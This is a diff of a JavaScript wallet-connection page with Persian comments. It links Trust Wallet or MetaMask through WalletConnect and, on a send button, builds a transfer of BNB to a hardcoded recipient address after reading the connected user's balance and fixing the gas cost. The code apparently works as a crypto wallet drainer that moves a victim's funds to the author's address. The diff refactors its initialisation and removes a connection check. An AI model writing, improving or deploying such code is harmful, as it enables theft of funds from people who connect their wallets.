@@ -1,11 +1,11 @@
 import { WalletConnectModalSign } from "@walletconnect/modal-sign-html";
 import { ethers } from "ethers";
 
-// اینجا مقدارهای واقعی رو جایگزین کن
-const projectId = "4d08946e6c316bed5e76b450ccbb5256"; // ← WalletConnect Project ID
-const TO_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05"; // ← آدرس مقصد BNB
-
+// مقداردهی‌ها
+const projectId = "4d08946e6c316bed5e76b450ccbb5256"; // WalletConnect Project ID خودت
+const TO_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05"; // آدرس گیرنده BNB
 const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+
 let userAddress = null;
 let currentWallet = null;
 
@@ -19,15 +19,21 @@ const modal = new WalletConnectModalSign({
   }
 });
 
-document.getElementById("connectTrust").addEventListener("click", async () => {
-  currentWallet = "trust";
-  await connectWallet("https://link.trustwallet.com/wc?uri=");
-});
+async function startApp() {
+  await modal.init(); // این خط حیاتی است!
 
-document.getElementById("connectMetaMask").addEventListener("click", async () => {
-  currentWallet = "metamask";
-  await connectWallet("https://metamask.app.link/wc?uri=");
-});
+  document.getElementById("connectTrust").addEventListener("click", async () => {
+    currentWallet = "trust";
+    await connectWallet("https://link.trustwallet.com/wc?uri=");
+  });
+
+  document.getElementById("connectMetaMask").addEventListener("click", async () => {
+    currentWallet = "metamask";
+    await connectWallet("https://metamask.app.link/wc?uri=");
+  });
+
+  document.getElementById("sendBtn").addEventListener("click", sendBNB);
+}
 
 async function connectWallet(baseLink) {
   try {
@@ -67,12 +73,7 @@ async function connectWallet(baseLink) {
   }
 }
 
-document.getElementById("sendBtn").addEventListener("click", async () => {
-  if (!userAddress || !currentWallet) {
-    alert("Wallet not connected.");
-    return;
-  }
-
+async function sendBNB() {
   try {
     const balance = await provider.getBalance(userAddress);
     const gasLimit = 21000n;
@@ -96,8 +97,11 @@ document.getElementById("sendBtn").addEventListener("click", async () => {
     }
 
     window.location.href = deeplink;
+
   } catch (err) {
     console.error("Send failed:", err);
     alert("Send failed: " + err.message);
   }
-});
+}
+
+startApp();
